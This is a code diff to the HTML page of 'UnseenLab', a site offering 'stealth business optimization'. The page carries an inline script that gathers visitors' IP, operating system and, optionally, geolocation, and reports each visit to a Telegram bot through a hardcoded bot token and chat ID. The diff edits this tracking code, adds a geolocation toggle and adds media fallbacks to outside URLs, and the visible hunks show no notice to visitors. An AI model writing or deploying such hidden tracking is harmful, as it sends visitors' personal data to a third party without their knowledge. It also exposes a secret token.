@@ -6,7 +6,7 @@
   <title>UnseenLab | Powered by ClouDesk Group</title>
   <meta name="description" content="UnseenLab - Stealth business optimization. We observe your business, discover hidden inefficiencies, and deliver custom solutions." />
   <meta name="keywords" content="business optimization, observation, data analysis, consulting, stealth business, UnseenLab, ClouDesk Group" />
-  <link rel="icon" href="favicon.png" type="image/png" />
+  <link rel="icon" href="favicon.png" type="image/png" onerror="this.href='https://cdn-icons-png.flaticon.com/512/149/149852.png'" />
 
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Open+Sans&display=swap" rel="stylesheet" />
 
@@ -1179,10 +1179,20 @@
   </div>
 
 <script>
-  // Telegram Bot Token and Chat ID - REPLACE WITH YOUR ACTUAL VALUES
+  // Telegram Bot Token and Chat ID
   const TELEGRAM_BOT_TOKEN = '8127107365:AAH-tlsI76LEXK764DeB4kLi0CubzFd8OXU';
   const TELEGRAM_CHAT_ID = '-1002687478362_2';
   
+  // Configuration - Set requestGeolocation to true to enable
+  const config = {
+    requestGeolocation: false, // Toggle this to enable/disable geolocation requests
+    geolocationOptions: {
+      maximumAge: 60000,
+      timeout: 5000,
+      enableHighAccuracy: true
+    }
+  };
+
   // Enhanced user tracking variables
   let userData = {
     ip: '',
@@ -1273,8 +1283,8 @@
     return os;
   }
 
-  // Try to get geolocation if user allows
-  if (navigator.geolocation) {
+  // Geolocation handling - now controlled by config.requestGeolocation
+  if (config.requestGeolocation && navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       position => {
         userData.geolocation = {
@@ -1286,12 +1296,15 @@
       },
       error => {
         userData.geolocation = 'denied';
-        logToTelegram('User denied location access', userData);
+        logToTelegram('User denied location access or error occurred', userData);
       },
-      { maximumAge: 60000, timeout: 5000, enableHighAccuracy: true }
+      config.geolocationOptions
     );
   } else {
-    userData.geolocation = 'unsupported';
+    userData.geolocation = config.requestGeolocation ? 'unsupported' : 'disabled';
+    if (!config.requestGeolocation) {
+      logToTelegram('Geolocation requests are disabled in configuration', userData);
+    }
   }
 
   // Track IP address and additional info
@@ -1543,6 +1556,8 @@
       report += `\n📍 Location: User denied access\n`;
     } else if (userData.geolocation === 'unsupported') {
       report += `\n📍 Location: Geolocation not supported\n`;
+    } else if (userData.geolocation === 'disabled') {
+      report += `\n📍 Location: Geolocation disabled in config\n`;
     }
     
     // Send the report
@@ -1695,8 +1710,70 @@
     }
   });
 
-  // Loader hide on page load
+  // Function to check if a file exists and fallback to URL if not
+  function getMediaSource(filename, fallbackUrl) {
+    return new Promise((resolve) => {
+      // Try to fetch the local file
+      fetch(filename, { method: 'HEAD' })
+        .then(() => resolve(filename))
+        .catch(() => resolve(fallbackUrl));
+    });
+  }
+
+  // List of all media files with their fallback URLs
+  const mediaFiles = [
+    { id: 'bgVideo', filename: 'video.mp4', fallback: 'https://github.com/ClouDesk/video1/raw/main/27725-365890983_small.mp4' },
+    { id: 'imgBanner1', filename: '1.jpg', fallback: 'https://images.unsplash.com/photo-1573164713988-8665fc963095?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1400&q=80' },
+    { id: 'imgBanner2', filename: '2.jpg', fallback: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1400&q=80' },
+    { id: 'imgBanner3', filename: '3.jpg', fallback: 'https://images.unsplash.com/photo-1600372431552-d10b8ccf70f0?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1400&q=80' },
+    { id: 'exampleImg4', filename: '4.jpg', fallback: 'https://images.unsplash.com/photo-1504384308090-c894fdcc538d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=140&q=80' },
+    { id: 'exampleImg5', filename: '5.jpg', fallback: 'https://images.unsplash.com/photo-1542281286-9e0a16bb7366?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=140&q=80' },
+    { id: 'exampleImg6', filename: '6.jpg', fallback: 'https://images.unsplash.com/photo-1515377905703-c4788e51af15?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=140&q=80' },
+    { id: 'exampleImg7', filename: '7.jpg', fallback: 'https://images.unsplash.com/photo-1491553895911-0055eca6402d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=140&q=80' },
+    { id: 'exampleImg8', filename: '8.jpg', fallback: 'https://images.unsplash.com/photo-1509395062183-67c5ad6faff9?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=140&q=80' },
+    { id: 'exampleImg9', filename: '9.jpg', fallback: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=140&q=80' },
+    { id: 'exampleImg10', filename: '10.jpg', fallback: 'https://images.unsplash.com/photo-1519389950473-47ba0277781c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=140&q=80' },
+    { id: 'exampleImg11', filename: '11.jpg', fallback: 'https://images.unsplash.com/photo-1505751172876-fa1923c5c528?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=140&q=80' },
+    { id: 'flagGB', filename: 'gb.svg', fallback: 'https://flagcdn.com/gb.svg' },
+    { id: 'flagIL', filename: 'il.svg', fallback: 'https://flagcdn.com/il.svg' },
+    { id: 'flagRU', filename: 'ru.svg', fallback: 'https://flagcdn.com/ru.svg' },
+    { id: 'flagSA', filename: 'sa.svg', fallback: 'https://flagcdn.com/sa.svg' }
+  ];
+
+  // Load all media with fallback
+  async function loadMediaWithFallback() {
+    for (const media of mediaFiles) {
+      const source = await getMediaSource(media.filename, media.fallback);
+      
+      if (media.id === 'bgVideo') {
+        // Special handling for video elements
+        const videoElement = document.getElementById(media.id);
+        if (videoElement) {
+          const sourceElement = videoElement.querySelector('source');
+          if (sourceElement) {
+            sourceElement.src = source;
+            videoElement.load();
+          }
+        }
+      } else if (media.id.startsWith('imgBanner')) {
+        // Handle background images in CSS
+        const elements = document.querySelectorAll(`.${media.id}`);
+        elements.forEach(el => {
+          el.style.backgroundImage = `url('${source}')`;
+        });
+      } else {
+        // Handle regular images
+        const elements = document.querySelectorAll(`[src="${media.filename}"]`);
+        elements.forEach(el => {
+          el.src = source;
+        });
+      }
+    }
+  }
+
+  // Run the media loading when the page loads
   window.addEventListener('load', () => {
+    loadMediaWithFallback();
     document.getElementById('loader').style.display = 'none';
     
     // Ensure videos are playing (some browsers require this)
